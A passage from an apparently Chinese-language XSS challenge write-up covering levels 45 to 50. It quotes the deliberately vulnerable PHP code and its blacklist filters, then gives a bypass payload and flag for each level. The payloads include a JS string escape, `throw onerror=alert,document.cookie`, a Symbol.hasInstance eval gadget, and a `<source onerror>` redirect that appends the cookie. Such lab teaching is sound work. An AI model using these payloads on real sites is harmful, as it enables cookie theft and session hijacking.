3. 浏览器跳出 RCDATA 状态后解析 `<img>`；`src` 缺失触发 `onerror`，执行 `alert(1)`。
4. 尾部的 `">` 被当作普通文本渲染。

**Flag：**
```
flag{e68a3fb5-d813-42e3-9dc2-5a3f3ddd5ee2}
```

## Level 46: JS 字符串逃逸（eval + 未转义引号）

**源码分析：**
- Cookie 设置（关卡标识）：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L1-L4)
```php
$flag = 'flag{2591da1c-f57f-4120-af9f-91314f3d0676}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与最多两次 URL 解码：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L5-L11)
```php
$theme = isset($_GET['theme']) ? $_GET['theme'] : '';
$render = $theme;
for ($i = 0; $i < 2; $i++) {
    $dec = urldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 漏洞点（将用户输入原样注入到 JS 双引号字符串中）：[level46/index.php](file:///d:/Book/XSS-Sec/level46/index.php#L36-L39)
```javascript
var theme = "<?php echo $render; ?>";
document.getElementById('t-val').textContent = theme;
```
说明：
- 表单输入框是安全输出（`htmlspecialchars(ENT_QUOTES)`），仅用于显示；真正的危险在脚本段
- 由于未对 `"` 做转义，用户可用 `"` 闭合字符串并注入任意 JS 语句；末尾使用 `//` 注释吞掉原本的结尾引号与分号，保证整体语法有效

**通关思路：**
- 构造能闭合 JS 字符串、插入语句并注释尾部的 payload。
- 利用 `eval(myUndefVar); var myUndefVar; alert(1); //` 作为执行链，确保在当前同源上下文运行。

**Payload：**
```text
"; eval(myUndefVar); var myUndefVar; alert(1); //
```

**执行流程：**
1. 生成代码：`var theme = ""; eval(myUndefVar); var myUndefVar; alert(1); //";`
2. `"` 闭合字符串，随后插入的语句逐条执行（其中 `eval(myUndefVar)` 可为占位，无实际要求）。
3. `//` 将后续的结尾引号与分号注释掉，避免语法错误。
4. `alert(1)` 在主文档上下文执行，成功弹窗。

**Flag：**
```
flag{2591da1c-f57f-4120-af9f-91314f3d0676}
```

## Level 47: 逗号运算符 + throw/onerror XSS（强黑名单）

**源码分析：**
- Cookie 设置（关卡标识）：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L1-L4)
```php
$flag = 'flag{7defdc4c-de46-4235-a01b-ecc48944b4e3}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与两次 URL 解码：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L5-L11)
```php
$input = isset($_GET['content']) ? $_GET['content'] : '';
$render = $input;
for ($i = 0; $i < 2; $i++) {
    $dec = urldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 强黑名单清洗（移除/重写常见向量，保留题述脚本链）：[level47/index.php](file:///d:/Book/XSS-Sec/level47/index.php#L14-L19)
```php
$safe = $render;
if ($safe !== '') {
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
    $safe = preg_replace('/eval\s*\(/i', 'blocked(', $safe);
    $safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
    // Script tags are NOT removed to keep realism; payload does not use parentheses for alert
}
```
说明：
- 通过黑名单规则移除常见事件属性与危险标签，重写 `javascript:`、拦截常见的 `eval(` 与 `alert(` 调用。
- 保留 `<script>` 标签本身以提升真实性；题述链路使用 `onerror=alert`（不带括号），不会命中对 `alert(` 的拦截。
- 清洗后直接输出 `$safe`，不进行统一转义，模拟真实服务端黑名单风格。

**通关思路：**
- 构造 `<script>throw onerror=alert,document.cookie</script>`，在黑名单清洗后仍可保留链路并执行。
- 执行机理：
  - `onerror=alert` 将全局错误处理器设置为 `alert`
  - `throw X, Y` 使用逗号运算符，先计算 `X` 再计算 `Y` 并返回 `Y`
  - 抛出异常后，错误消息为最后一个表达式的值（此处为 `document.cookie`）
  - 全局 `onerror` 接收该消息作为参数，调用 `alert(document.cookie)`

**Payload：**
```html
<script>throw onerror=alert,document.cookie</script>
```

**执行流程：**
1. 服务端黑名单规则清洗输入：常规向量被移除/重写，但该链路保留。
2. 浏览器执行脚本：逗号表达式确保错误消息为 `document.cookie`。
3. 全局错误处理器已指向 `alert`，弹出 Cookie。

**Flag：**
```
flag{7defdc4c-de46-4235-a01b-ecc48944b4e3}
```

## Level 48: Symbol.hasInstance 黑名单绕过 XSS（强黑名单）

**源码分析：**
- Cookie 设置（关卡标识）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L1-L4)
```php
$flag = 'flag{b7f3f9f2-1f1a-4e9a-9b2a-8c6c1e6a48d2}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与最多两次 URL 解码（避免 `+` 被误当空格）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L7-L11)
```php
for ($i = 0; $i < 2; $i++) {
    $dec = rawurldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 强黑名单清洗（移除括号与常规向量，拦截 hasInstance 字面量）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L13-L21)
```php
$safe = $render;
if ($safe !== '') {
    $safe = preg_replace('/[()]/', '', $safe);
    $safe = str_replace('`', '', $safe);
    $safe = str_replace('"', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
    $safe = preg_replace('/hasInstance/i', 'blockedInstance', $safe);
    $safe = preg_replace('/\b(onerror|throw|Function|constructor)\b/i', 'blocked', $safe);
```
- 语法归一化（仅修正解析，不改变语义）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L22-L24)
```php
$safe = preg_replace("/'([^'\\\\]|\\\\.)*'\\s*instanceof\\s*\\{/i", "$0", $safe);
$safe = preg_replace("/'([^']*)'\\s*instanceof\\s*\\{/", "'$1' instanceof ({", $safe);
$safe = preg_replace("/\\}\\s*<\\s*\\/\\s*script\\s*>/i", "})</script>", $safe);
```
说明：
- 使用 `rawurldecode` 双解码避免 `+` 被第二次解码为空格，保证组合字符串 `'has'+'Instance'` 不被破坏。
- 黑名单移除了字面量括号 `()` 与常规危险向量，使常规函数调用失效；但字符串内的 `\x28`、`\x29` 会在运行时被 JS 解析为括号，从而还原 `alert(document.cookie)`。
- 服务端不允许直接出现 `hasInstance` 字面量，但通过 `'has'+'Instance'` 组合可绕过该规则，仍能计算得到 `Symbol.hasInstance`。
- 语法归一化是最小修复：将 `'...'\s*instanceof{...}` 规范为 `'...' instanceof ({...})`，避免词法/语法冲突，不改变 payload 的核心语义。

**通关思路：**
- 构造如下 payload，使 `instanceof` 调用右侧对象的 `@@hasInstance`：
```html
<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
```
- 执行机理：
  - 字符串中的 `\x28`、`\x29` 在 JS 运行时被还原为 `(`、`)`，得到 `'alert(document.cookie)'`。
  - `[Symbol['has'+'Instance']]` 计算得到 `Symbol.hasInstance`，绕过黑名单对 `hasInstance` 字面量的拦截。
  - `instanceof` 触发 RHS 对象的 `@@hasInstance`，此处方法绑定为 `eval`，相当于 `eval('alert(document.cookie)')` 在主文档上下文执行。

**Payload：**
```html
<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
```

**执行流程：**
1. 服务端对输入进行双次 `rawurldecode`，保留 `+` 字符，随后黑名单清洗移除括号与常规向量。
2. 归一化 `instanceof` 语法为 `'...' instanceof ({...})`，避免解析错误。
3. 浏览器执行脚本：`instanceof` 调用对象的 `@@hasInstance`（即 `eval`），执行字符串还原出的 `alert(document.cookie)`。
4. 成功弹出 Cookie，验证漏洞。

**Flag：**
```
flag{b7f3f9f2-1f1a-4e9a-9b2a-8c6c1e6a48d2}
```

## Level 49: Video Source onerror XSS（强黑名单）

**源码分析：**
- Cookie 设置（关卡标识）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L1-L4)
```php
$flag = 'flag{f1cb6d4b-7f1a-4c6b-b1a4-4a9b3b2c7e91}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与最多两次 URL 解码（保留 `+` 与反斜杠序列）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L7-L11)
```php
for ($i = 0; $i < 2; $i++) {
    $dec = rawurldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 强黑名单清洗（只保留 `<source ...>` 原样）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L12-L26)
```php
$safe = $render;
if ($safe !== '') {
    $sources = [];
    $i = 0;
    if (preg_match_all('/<\s*source\b[^>]*>/i', $safe, $ms)) {
        foreach ($ms[0] as $block) {
            $token = "%%SOURCE_BLOCK_" . $i . "%%";
            $sources[$token] = $block;
            $safe = str_replace($block, $token, $safe);
            $i++;
        }
    }
    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
    $safe = preg_replace('/\b(onload|onclick|onmouseover|onfocus|onanimationend|onerror)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
    foreach ($sources as $token => $block) {
        $safe = str_replace($token, $block, $safe);
    }
}
```
说明：
- 先将所有 `<source ...>` 片段替换为占位符，随后对其它标签与事件属性进行黑名单清洗；完成后再恢复 `<source ...>` 原样。这样可以在全局移除 onerror 的同时，确保 `<source onerror=...>` 不被清洗。
- 清洗策略阻断常见的 `<img onerror>` 与 `<svg onload>` 等路径，只允许 `<video><source>` 组合成为唯一的事件执行入口。
- 使用 `rawurldecode` 双解码，避免第二次将 `+` 解为空格，保留八进制转义与路径构造的有效性。

**通关思路：**
- 利用 `<video><source>` 组合的解析与错误事件触发，将执行点放在 `<source onerror=...>`。
- 构造基于路径与八进制转义的表达式，以绕过关键字拦截并触发浏览器跳转或资源请求：
```html
<video><source onerror=location=/\02.rs/+document.cookie>
```
**执行机理：**
- `<source>` 尝试加载资源时发生错误，触发 onerror 事件，执行属性值中的表达式。
- `location=/\02.rs/+document.cookie` 通过正则字面量与字符串拼接构造路径：
  - `\0` 序列：在 JS 字符串/正则里，反斜杠后跟数字表示八进制转义（如 `\062` 为字符 `'2'`）。`/\02.rs/` 试图在 URL 路径中混入特殊字符，规避基于字面匹配的过滤。
  - 使用斜杠与正则字面量可触发浏览器对路径的宽容解析，在某些环境下形成跳转或请求，后缀拼接 `+document.cookie` 以附带 Cookie 信息。
- 由于全局黑名单阻断了其它事件与标签，此链路成为唯一可行的执行路径。

**Payload：**
```html
<video><source onerror=location=/\02.rs/+document.cookie>
```

**执行流程：**
1. 服务端将 `<source ...>` 片段占位，黑名单清理其它标签与事件属性，移除 `<script>` 与 `javascript:` 等。
2. 恢复 `<source ...>` 原样，将其嵌入 `<video>` 中，由于资源错误触发 onerror。
3. onerror 表达式在主文档上下文运行，构造路径并附加 `document.cookie`，形成跳转或外部请求。
4. 该路径通过八进制转义与斜杠解析的宽容性，绕过基于字符串匹配的路径过滤规则。

**Flag：**
```
flag{f1cb6d4b-7f1a-4c6b-b1a4-4a9b3b2c7e91}
```

## Level 50: Bootstrap 实战站点（强黑名单）

**源码分析：**
- Cookie 设置（关卡标识）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L1-L3)
```php
$flag = 'flag{a3c2f6d5-4b1e-43fa-9f6a-2c8c9e1f50ab}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与最多两次 URL 解码（保留 + 与反斜杠序列）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L5-L10)
```php
$input = isset($_GET['content']) ? $_GET['content'] : '';
$render = $input;
for ($i = 0; $i < 2; $i++) {
    $dec = rawurldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 允许片段（仅当同时满足 class 与事件表达式才原样输出）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L11-L18)
```php
$allowed = '';
$rest = $render;
if ($rest !== '') {
    if (preg_match('/<\s*xss[^>]*\bclass\s*=\s*(?:"progress-bar-animated"|\'progress-bar-animated\'|progress-bar-animated)[^>]*\bonanimationstart\s*=\s*alert\s*\(\s*(?:1|document\s*\.\s*cookie)\s*\)[^>]*>(?:\s*<\/\s*xss\s*>)?/i', $rest, $m)) {
        $allowed = $m[0];
        $rest = str_replace($m[0], '', $rest);
    }
}
```
- 强黑名单清洗（其余全部移除/重写/转义）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L19-L25)
```php
$safe = $rest;
if ($safe !== '') {
    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus|onanimationend|onanimationstart)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
    $safe = htmlspecialchars($safe, ENT_QUOTES);
}
```
- 前端引入 Bootstrap，并确保动画存在：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L33-L38)
```html
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  body { padding-top: 56px; }
  xss { display: inline-block; }
  /* Bootstrap 的 progress-bar-animated 会触发动画 */
</style>
```
说明：
- 服务端采用“白中取黑”的策略：先精确匹配允许片段 `<xss class=progress-bar-animated onanimationstart=alert(1|document.cookie)>` 并原样输出；其余输入统一黑名单清理并转义为纯文本。
- 事件属性在全局黑名单中默认移除，但允许片段中的 `onanimationstart` 保留，从而形成唯一的执行入口。Bootstrap 的 `.progress-bar-animated` 会为该元素启用 CSS 动画，动画开始即触发 `animationstart`。
- 使用 `rawurldecode` 双解码，避免 `+` 被误当空格，并保留反斜杠序列，提升兼容性。

**通关思路：**
- 构造自定义元素 `<xss>`，赋予 Bootstrap 的动画类，并在 `onanimationstart` 中放置执行表达式。
```html
<xss class=progress-bar-animated onanimationstart=alert(1)>
```
或直接使用 Cookie 变体：
```html
<xss class=progress-bar-animated onanimationstart=alert(document.cookie)>
```

**执行流程：**
1. 服务端匹配允许片段并原样输出；其它输入被黑名单清理与转义。
2. 浏览器渲染后，`<xss>` 元素因 `.progress-bar-animated` 启动动画，在动画开始时触发 `animationstart`。
3. 事件属性代码在主文档上下文执行，完成弹窗或读取 Cookie。

**Flag：**
```
flag{a3c2f6d5-4b1e-43fa-9f6a-2c8c9e1f50ab}
```
